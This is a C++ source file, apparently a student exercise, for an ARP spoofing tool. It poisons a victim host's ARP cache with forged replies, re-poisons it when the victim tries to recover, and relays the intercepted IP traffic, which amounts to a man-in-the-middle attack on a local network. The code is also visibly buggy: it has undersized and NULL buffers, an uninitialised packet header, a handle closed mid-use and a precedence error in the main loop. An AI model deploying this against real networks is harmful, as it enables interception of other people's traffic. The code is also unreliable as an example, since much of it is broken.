#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
//ip_addr
#include <stdint.h>
#include <stdio.h>
#include<stdlib.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <arpa/inet.h>
//mac addr
#include <netinet/ether.h>
//send_packet
#include <libnet.h>

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}
char* get_myip(){
	struct ifreq ifr;
	char* ipstr = (char*)malloc(sizeof(char*));
	int s;
	
	s = socket(AF_INET,SOCK_DGRAM,0);
	strncpy(ifr.ifr_name,"eth0",IFNAMSIZ);

	if(ioctl(s,SIOCGIFADDR,&ifr)<0){
		printf("Error");
		return NULL;
	}else{
		inet_ntop(AF_INET,ifr.ifr_addr.sa_data+2,ipstr,sizeof(struct sockaddr));
		return ipstr;
	}
	return NULL;
}
char* get_mymac()
{
		char* mac_addr = (char*)malloc(sizeof(char*));
        struct ifreq ifr;
        int sockfd, ret;
        sockfd = socket(AF_INET, SOCK_DGRAM,0);
        if(sockfd<0){
                printf("Fail to get interface MAC address\n");
                return NULL;
        }
        strncpy(ifr.ifr_name,"eth0",IFNAMSIZ);
        ret = ioctl(sockfd,SIOCGIFHWADDR,&ifr);
        if (ret < 0){
                printf("Fail to get interface MAC address\n");
                return NULL;
        }
		sprintf(mac_addr,"%02x:%02x:%02x:%02x:%02x:%02x",ifr.ifr_hwaddr.sa_data[0],ifr.ifr_hwaddr.sa_data[1],ifr.ifr_hwaddr.sa_data[2],ifr.ifr_hwaddr.sa_data[3],ifr.ifr_hwaddr.sa_data[4],ifr.ifr_hwaddr.sa_data[5]);
        close(sockfd);
        return mac_addr;
}
int send_packet(pcap_t* handle, char* dev, char* eth_dmac, char* eth_smac, char* arp_tmac, char* arp_smac, int op, char* sip, char* tip){
	
	char errbuf[PCAP_ERRBUF_SIZE];
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	struct pcap_pkthdr* header;
	EthArpPacket s_packet;
	s_packet.eth_.dmac_ = Mac(eth_dmac);
	s_packet.eth_.smac_ = Mac(eth_smac);
	s_packet.eth_.type_ = htons(EthHdr::Arp);
	s_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	s_packet.arp_.pro_ = htons(EthHdr::Ip4);
	s_packet.arp_.hln_ = Mac::SIZE;
	s_packet.arp_.pln_ = Ip::SIZE;
	if(op == 1) s_packet.arp_.op_ = htons(ArpHdr::Request);
	else if(op ==0) s_packet.arp_.op_ = htons(ArpHdr::Reply);
	s_packet.arp_.smac_ = Mac(arp_smac);
	s_packet.arp_.sip_ = htonl(Ip(sip));
	s_packet.arp_.tmac_ = Mac(arp_tmac);
	s_packet.arp_.tip_ = htonl(Ip(tip));
	//send packet
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&s_packet), sizeof(EthArpPacket));
	if(res !=0) {
		fprintf(stderr,"packet send error!");
		return -1;
	}
	pcap_close(handle);
	return res;
}
char* get_MAC(pcap_t* handle,char* dev,char* src_mac, char* sip,char* tip){
	char* trgt_mac = NULL;
	//send packet
	char* eth_brdcst = NULL;
	char* arp_brdcst = NULL;
	sprintf(eth_brdcst,"FF:FF:FF:FF:FF:FF");
	sprintf(arp_brdcst,"00:00:00:00:00:00");
	//recv packet
	while(true){
		send_packet(handle,dev,eth_brdcst,src_mac,arp_brdcst,src_mac,1,sip,tip);
		const u_char* r_packet;
		struct pcap_pkthdr* header;
		int res = pcap_next_ex(handle,&header,&r_packet);
		if(res == 0) continue;
		if(res == -1 || res == -2){
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return 0;
		}
		EthArpPacket res_packet;
		EthArpPacket test;
		test.arp_.sip_ = htonl(Ip(sip));
		test.arp_.tip_ = htonl(Ip(tip));
		test.arp_.tmac_ = Mac(src_mac);
		memcpy(&res_packet,r_packet,(size_t)sizeof(EthArpPacket));
		if((res_packet.arp_.sip_ == test.arp_.sip_) && (res_packet.arp_.tip_==test.arp_.tip_) && (res_packet.arp_.tmac_==test.arp_.tmac_)){
			sprintf(trgt_mac,"%02x:%02x:%02x:%02x:%02x:%02x",res_packet.arp_.smac_[0],res_packet.arp_.smac_[1],res_packet.arp_.smac_[2],res_packet.arp_.smac_[3],res_packet.arp_.smac_[4],res_packet.arp_.smac_[5]);
			return trgt_mac;
		}else{
			continue;
		}

	}

}
void spoof(pcap_t* handle,char* dev, char* atkr_mac, char* sndr_mac,char* trgt_mac ,char* atkr_ip,char* sndr_ip,char* trgt_ip){
	while(true){
		struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) continue;
        if(res == -1 || res == -2){
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));  
            return;   
        }
        if(header->caplen < LIBNET_ETH_H || header->caplen > 1500){
            continue;
        }
		//RECOVER PROTECT
		EthArpPacket reinfect;
		memcpy(&reinfect,packet,sizeof(EthArpPacket));
		if((reinfect.arp_.op_==ARPOP_REQUEST)&&(reinfect.arp_.sip_ == Ip(sndr_ip)) &&(reinfect.arp_.tip_ == Ip(trgt_ip)) && (reinfect.arp_.smac_ == Mac(sndr_mac))&& (reinfect.arp_.tmac_ == Mac(trgt_mac))){
			//REINFECT
			printf("SEND RECOVER PROTECTER");
			for(int i=0;i<3;i++){
				send_packet(handle,dev,sndr_mac,atkr_mac,sndr_mac,atkr_mac,0,atkr_ip,sndr_ip);
			}
			continue;
		}
		//RELAY : target -> sender  ==> attacker -> sender
		struct libnet_ethernet_hdr relay_pkt;
		if(relay_pkt.ether_type == htons(ETHERTYPE_IP)){ // ip packet relay
			if((relay_pkt.ether_shost == (uint8_t*)sndr_mac)&& (relay_pkt.ether_dhost == (uint8_t*)atkr_mac)){ // src dst check
				//packet forgery : (eth)src mac -> trgt mac , (arp)src mac -> atkr mac 
				u_char *relay = (u_char *)calloc(header->caplen+1, sizeof(u_char));
				memcpy(relay,packet,header->caplen);
				memcpy(relay,trgt_mac,6); //(eth)src mac -> trgt mac
				memcpy(relay+6,atkr_mac,6); //(arp)src mac -> atkr mac 
				int res = pcap_sendpacket(handle, (const u_char*)relay, header->caplen); //send  packet
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
			}
		}

	}
	
}
int main(int argc, char* argv[]) {
	if (argc <4 || argc %2 ==1) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	for(int i=0;i<argc-1/2;i++){
		//get attacker ip_addr
		char* atkr_ip;
		atkr_ip = get_myip();
		printf("attacker ip : %s\n",atkr_ip);
		//get attacker mac
		char* atkr_mac;
		atkr_mac = get_mymac();
		printf("attacker mac : %s\n",atkr_mac);
		//sender ip and target ip
		char* sndr_ip = argv[2*i+2];
		char* trgt_ip = argv[2*i+3];
		printf("sender ip : %s\n",sndr_ip);
		printf("target ip : %s\n",trgt_ip);
		//get MAC of target & sender
		char* sndr_mac = get_MAC(handle,dev,atkr_mac,atkr_ip,sndr_ip);
		char* trgt_mac = get_MAC(handle,dev,atkr_mac,atkr_ip,trgt_ip);
		printf("sender mac : %s\n",sndr_mac);
		printf("target mac : %s\n",trgt_mac);

		//send arp packet (attack)
		send_packet(handle,dev,sndr_mac,atkr_mac,sndr_mac,atkr_mac,0,atkr_ip,sndr_ip);
		//relay & keep arp table changed 
		spoof(handle,dev,atkr_mac,sndr_mac,trgt_mac,atkr_ip,sndr_ip,trgt_ip);//이부분만 만들기.


		pcap_close(handle);
	}
	
}